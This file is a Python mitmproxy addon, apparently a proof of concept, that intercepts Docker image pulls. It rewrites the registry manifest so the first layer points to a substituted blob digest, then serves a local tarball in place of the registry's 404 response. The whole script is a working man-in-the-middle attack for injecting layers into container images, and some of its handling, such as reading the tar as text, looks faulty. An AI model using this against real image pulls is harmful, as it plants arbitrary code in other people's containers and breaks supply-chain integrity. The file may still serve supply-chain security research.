# Copyright 2016-2017 VMware, Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import typing
import json
import mitmproxy.http
from mitmproxy import ctx

# This plugin for MITMproxy injects a layer from a tarball into a docker image at pull time, in flight
class DockerLayerInserter:
    def response(self, flow: mitmproxy.http.HTTPFlow):
        # if we see a v1 manifest in the response, insert an fsLayer with the shasum of our layer and add a history item so docker accepts them
        if (flow.response.headers['Content-Type'].find("application/vnd.docker.distribution.manifest.v2") != -1 
        or flow.response.headers['Content-Type'].find("application/vnd.docker.distribution.manifest.v1+prettyjws") != -1):
            t = flow.response.content.decode('utf-8')
            j = json.loads(t)
            
            if flow.response.headers['Content-Type'].find("application/vnd.docker.distribution.manifest.v2") != -1:
                j['layers'][0] = {'blobSum': 'sha256:60f5d4e81e00e952449a18c753cedf49b8a04a2a96a4a5d439298d5fa9626f8d'}
                #j['history'].append(j['history'][-1])
            else:
                j['fsLayers'][0] = {'blobSum': 'sha256:60f5d4e81e00e952449a18c753cedf49b8a04a2a96a4a5d439298d5fa9626f8d'}

            flow.response.content = bytes(json.dumps(j).encode('utf-8'))

        
        # after the above injection, the docker client will request the new layer added to fsLayers, but the registry will return 404
        if flow.response.status_code == 404:
            # add a simple layer matching the blobsum and change status code
            with open('helloworld.tar') as f:
                flow.response.content = bytes(f.read().encode('utf-8'))
                flow.response.headers['Content-Length'] = "{}".format(len(flow.response.content))
                flow.response.status_code = 200
                flow.response.reason = 'OK'
        

addons = [
    DockerLayerInserter()
]
